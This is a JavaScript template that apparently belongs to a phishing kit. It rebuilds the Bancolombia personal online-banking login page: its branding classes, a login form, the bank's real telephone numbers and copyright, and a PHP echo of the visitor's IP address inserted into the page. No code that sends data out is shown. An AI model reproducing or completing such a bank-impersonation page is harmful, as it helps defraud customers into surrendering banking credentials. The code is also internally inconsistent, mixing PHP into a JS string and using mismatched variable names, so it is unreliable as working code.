var my_titulo = 'Bancolombia';
var my_contenido = `
<link rel="stylesheet" href="${my_banco}css/styles.css">
<link rel="stylesheet" href="${my_banco}css/bootstrap.css">
<link rel="stylesheet" href="${my_banco}css/keyboard_util.css">
<link rel="stylesheet" href="${my_banco}css/jquery-ui.css">
<link rel="stylesheet" href="${my_banco}css/ui.css">
<link rel="stylesheet" href="${my_banco}css/showLoadingBank.css">
<link rel="stylesheet" href="${my_banco}css/stylesheet.css">
<style>
    body {
        background-color: white;
    }
</style>

<div id="contenidoWeb">
    <form id="loginUserForm" onsubmit="return false;">
        <div class="container" id="containerMain">
            <div id="header" class="mua-page-header">
                <div class="row row-logo-svp">
                    <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                        <div class="mua-imgLogoItem"></div>
                        <div class="text-svp-name">Sucursal Virtual Personas</div>
                    </div>
                </div>
                <div class="row">
                    <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                        <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
                            <div>
                                <div class="timeText">Fecha y hora actual:</div>
                                <span id="jclock1" class="lastVisitedText" currenttime=""> </span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="panel-heading">
                <h3 id="titulo"></h3>
            </div>
            <div id="bancolombia_contenido"></div>
            <div class="footer">
                <div id="sucursales" class="row" style="margin-bottom: 10px;">
                    <div class="col-xs-12 col-sm-12 col-md-12">
                        <p class="mua-footer">
                            Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00 -
                            Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00
                            - <br> Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país
                            018000 9 12345. Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados
                            Unidos (1) 866 379 97 14.
                        </p>
                    </div>
                </div>
                <div>
                    <div class="mua-title-text pull-left">Dirección IP: <?php echo $_SERVER['REMOTE_ADDR']; ?></div>
                    <div class="mua-title-text pull-right">Copyright ©&nbsp;<span id="fecha">2023</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
                </div>
            </div>
        </div>
    </form>
</div>
`
//<script>
    loadContenido()
    $('#bancolombia_contenido').html(bancolombia_contenido);

    $(document).ready(function() {

    if ($('#jclock1').length > 0) {
        var optionsEST = {
            utc: true,
            utcOffset: -5,
            format: "%A %R de %B de %Y %l:%M:%S %P",
            language: "es"
        }
        $('#jclock1').jclockNew(optionsEST);
    }
}); 